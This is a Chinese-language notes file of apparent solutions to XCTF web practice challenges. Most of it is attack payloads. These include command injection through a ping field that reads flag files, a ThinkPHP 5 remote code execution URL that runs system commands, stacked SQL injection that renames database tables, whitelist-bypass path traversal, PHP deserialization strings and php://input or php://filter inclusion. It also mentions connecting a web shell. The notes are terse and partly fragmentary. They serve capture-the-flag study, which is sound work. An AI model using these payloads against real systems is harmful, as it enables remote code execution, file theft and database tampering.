XCTF-Exersice Area-Web

答题——web——新手

1
禁用js/F12

2
`robots.txt`在网站根目录
里面可以规定搜索引擎看或者不看什么内容

3

备份文件
`xxxx.txt.bak`
`index.phps` `xxxx.rar .zip .7z .tar.gz .bak .txt .swp`

github
`www.xxx.com/.git/config`

苹果电脑
`.DS_Store`
文件/目录泄露

`svn`文件泄露
`subversion`，开源代码控制系统
`www.xxx.com/.svn/entires`

4
burp可以看到cookie的提示
可以使用f12的`network`看，或者burp的histroy看到`response`

5
如果一个按钮不能点，`disabled=""`，删掉前端元素

6
`/?a=0a&b=1235x`

弱类型

8
`X-Forwarded-For: 123.123.123.123`
来路ip地址
`Referer:https://www.google.com`
从哪个页面来的

10
使用菜刀连接

11
`127.0.0.1|find / -name "flag*"`查找文件
`127.0.0.1|cat ../../../home/flag.txt`

12
十六进制
`\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30`
十进制
`55,56,54,79,115,69,114,116,107,49,50`
ascii码
`786OsErtk12`



进阶——

1



2 代码审计——做实验

```
<?php
highlight_file(__FILE__);
class emmm
{
    //检查输入参数
    public static function checkFile(&$page)
    {
        //定义白名单
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        //是否有page参数，如果没有或者不是字符串，就false
        if (! isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }

        //page是否在白名单
        if (in_array($page, $whitelist)) {
            return true;
        }

        //截取?之前的内容
        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        //如果?之前的内容在白名单里，程序结束
        if (in_array($_page, $whitelist)) {
            return true;
        }
        //urldecode
        $_page = urldecode($page);
        //再来一遍
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}

//主要逻辑
if (! empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
?> 
```

O:+4:"Demo":2:{s:10:"%00Demo%00file";s:8:"fl4g.php";}  在burp里%00需要处理一次再base64

TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==



3` thinkphp`框架漏洞

exp：

`/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`



4 堆叠注入：——**修改数据库表，换名**

`/?inject=1';show databases; --+`

`/?inject=1';show tables; --+`
1919810931114514
words

``/?inject=1';show columns from `words`; --+``
words里面
id data
1919810931114514里面
flag

推断：
``select id,data from `words` where id='$id'``

``rename tables `words` to `haha`;``
``rename tables `1919810931114514` to `words`;``
``alter table `words` change `flag` `id` varchar(100);``


`/?inject=1' or 1 --+`







进阶：
1
index.php--->1.php
做了302，查看response

2
提示flag在
ffffllllaaaagggg
/source.php?file=hint.php%25%33%66/../../../../../../../../../../ffffllllaaaagggg

5
O:4:"xctf":2:{s:4:"flag";s:3:"111";}

6
O:+4:"Demo":2:{s:10:"%00Demo%00file";s:8:"fl4g.php";}
%00在burp中urldecode之后再base64加密
TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

7
thinkphp v5漏洞

exp
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls

8
/?hello=xxxxx&page=Php://input
<?php system("ls");?>

9
/?inject=1';show databases; --+

/?inject=1';show tables; --+
1919810931114514
words

/?inject=1';show columns from `words`; --+
words里面
id data
1919810931114514里面
flag

推断：
select id,data from `words` where id='$id'

rename tables `words` to `haha`;
rename tables `1919810931114514` to `words`;
alter table `words` change `flag` `id` varchar(100);

输出绝对正确的答案
/?inject=1' or 1 --+

12
js可以使用eval把字符串当作js执行，也可以alert弹窗
be0f233ac7be98aa

24
[true,true,true,true,true,true,true]

\-----------------

lang=php://filter/read=convert.base64-encode/resource=

[1-1000].php
1.php[1-1000].
md5(1.php[1-1000]).php

